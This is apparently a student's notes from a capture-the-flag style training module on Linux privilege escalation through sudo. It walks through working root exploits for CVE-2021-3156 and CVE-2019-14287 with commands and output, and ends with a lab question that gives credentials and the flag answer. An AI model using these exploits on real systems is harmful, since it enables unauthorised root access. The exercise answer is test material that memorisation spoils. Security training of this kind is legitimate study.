# Sudo
The program sudo is used under UNIX operating systems like Linux or macOS to start processes with the rights of another user. The `/etc/sudoers` file specifies which users or groups are allowed to run specific programs and with what privileges.

```sh
$ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
[sudo] password for cry0l1t3:  **********

Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d
```

To find out the version of sudo, the following command is sufficient:

```sh
$ sudo -V | head -n1

Sudo version 1.8.31
```

One of the latest vulnerabilities for sudo carries the [CVE-2021-3156](https://github.com/blasty/CVE-2021-3156) and is based on a heap-based buffer overflow vulnerability.

```sh
$ git clone https://github.com/blasty/CVE-2021-3156.git
$ cd CVE-2021-3156
$ make

rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
$ ./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
$ cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
$ ./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **

# id

uid=0(root) gid=0(root) groups=0(root)
```

## Sudo Policy Bypass
Another vulnerability was found in 2019 that affected all versions below 1.8.28, which allowed privileges to escalate even with a simple command. This vulnerability has the CVE-2019-14287 and requires only a single prerequisite. It had to allow a user in the `/etc/sudoers` file to execute a specific command.

```sh
$ sudo -l
[sudo] password for cry0l1t3: **********

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

In fact, Sudo also allows commands with specific user IDs to be executed, which executes the command with the user's privileges carrying the specified ID. The ID of the specific user can be read from the `/etc/passwd` file.

```sh
$ cat /etc/passwd | grep cry0l1t3

cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

Thus the ID for the user `cry0l1t3` would be `1005`. If a negative ID (`-1`) is entered at sudo, this results in processing the ID `0`, which only the `root` has. This, therefore, led to the immediate root shell.

```sh
$ sudo -u#-1 id

root@nix02:/home/cry0l1t3# id

uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```

## Questions
SSH to 10.129.205.110 (ACADEMY-LLPE-SUDO), with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Escalate the privileges and submit the contents of flag.txt as the answer. **Answer: HTB{SuD0_e5c4l47i0n_1id}**
   - Check sudo version → vulnerable to CVE-2019-14287:
   - Notice we can run ncdu as any user except root, but combined with CVE-2019-14287 we can leverage it to gain root:
        ```sh
        $ sudo  -l
        Matching Defaults entries for htb-student on ubuntu:
            env_reset, mail_badpass,
            secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

        User htb-student may run the following commands on ubuntu:
            (ALL, !root) /bin/ncdu
        $ sudo -u#-1 ncdu
        b
        # cat /root/flag.txt
        HTB{SuD0_e5c4l47i0n_1id}
        ```